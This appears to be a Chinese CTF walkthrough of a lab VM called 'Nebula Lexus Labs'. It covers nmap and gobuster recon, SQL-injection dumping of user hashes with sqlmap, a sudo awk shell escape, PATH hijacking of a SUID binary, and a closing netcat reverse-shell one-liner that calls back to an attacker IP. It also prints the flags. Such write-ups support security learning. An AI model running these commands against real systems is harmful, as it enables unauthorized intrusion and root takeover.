### 主机发现和nmap扫描

```bash
nmap -sn 192.168.56.0/24
```

靶机ip：192.168.56.106

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.106
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
nmap -sT -sV -sC -O -p22,80 192.168.56.106
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Nebula Lexus Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

```bash
nmap --script=vuln -p22,80 192.168.56.106
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-cookie-flags: 
|   /login/: 
|     PHPSESSID: 
|_      httponly flag not set
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.106
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.106:80/login/
|     Form id: username
|     Form action: /login/index.php
|     
|     Path: http://192.168.56.106:80/login/index.php
|     Form id: username
|_    Form action: /login/index.php
| http-enum: 
|   /login/: Login page
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
```

### web渗透

访问80端口，有一个登录页面，弱密码登不上去

#### 目录扫描

```bash
gobuster dir -u http://192.168.56.106/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt
```

```
/img                  (Status: 301) [Size: 314] [--> http://192.168.56.106/img/]
/login                (Status: 301) [Size: 316] [--> http://192.168.56.106/login/]
/joinus               (Status: 301) [Size: 317] [--> http://192.168.56.106/joinus/]
```

访问/joinus发现一对凭据

> admin:d46df8e6a5627debf930f7b5c8f3b083

```
https://nebulalabs.org/meetings?user=admin&password=d46df8e6a5627debf930f7b5c8f3b083
```

登录进去，发现search_central.php页面存在sql注入漏洞

```bash
sqlmap -u http://192.168.56.106/login/search_central.php?id=1 -D nebuladb -T users -C username,password --dump
```

```
+-------------+----------------------------------------------+
| username    | password                                     |
+-------------+----------------------------------------------+
| admin       | d46df8e6a5627debf930f7b5c8f3b083             |
| pmccentral  | c8c605999f3d8352d7bb792cf3fdb25b (999999999) |
| Frederick   | 5f823f1ac7c9767c8d1efbf44158e0ea             |
| Samuel      | 4c6dda8a9d149332541e577b53e2a3ea             |
| Mary        | 41ae0e6fbe90c08a63217fc964b12903             |
| hecolivares | 5d8cdc88039d5fc021880f9af4f7c5c3             |
| pmccentral  | c8c605999f3d8352d7bb792cf3fdb25b (999999999) |
+-------------+----------------------------------------------+
```

### 系统立足点

```bash
ssh pmccentral@192.168.56.106
```

### awk提权

```bash
pmccentral@laboratoryuser:~$ sudo -l
[sudo] password for pmccentral: 
Matching Defaults entries for pmccentral on laboratoryuser:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pmccentral may run the following commands on laboratoryuser:
    (laboratoryadmin) /usr/bin/awk
pmccentral@laboratoryuser:~$ sudo -u laboratoryadmin awk 'BEGIN{system("/bin/bash")}'
```

拿到user.txt

```bash
laboratoryadmin@laboratoryuser:~$ cat user.txt 
flag{$udOeR$_Pr!V11E9E_I5_7En53}
```

```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ ls -la
total 32
drwxr-xr-x 2 laboratoryadmin laboratoryadmin  4096 Jun  5 15:13 .
drwx------ 8 laboratoryadmin laboratoryadmin  4096 Jun  5 15:13 ..
-rwxrwxr-x 1 laboratoryadmin laboratoryadmin     8 Jun  5 15:13 head
-rwsr-xr-x 1 root            root            16792 Dec 17 15:40 PMCEmployees
```

PMCEmployees有s权限

![image-20240606131802800](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240606131802800.png)

引用了head文件执行了命令

### 环境变量劫持提权

```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
laboratoryadmin@laboratoryuser:~/autoScripts$ export PATH="$PWD:$PATH"
laboratoryadmin@laboratoryuser:~/autoScripts$ echo $PATH
/home/laboratoryadmin/autoScripts:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

当前文件夹里的head已经给了，直接执行就行

```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees 
root@laboratoryuser:~/autoScripts#
```

拿到root.txt

```bash
root@laboratoryuser:/root# cat root.txt 
flag{r00t_t3ns0}
```

另外提权方案

```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ echo "cat /root/root.txt" >head
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees 
flag{r00t_t3ns0}
```

```bash
laboratoryadmin@laboratoryuser:~/autoScripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.56.101 1234 >/tmp/f" >head
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
```

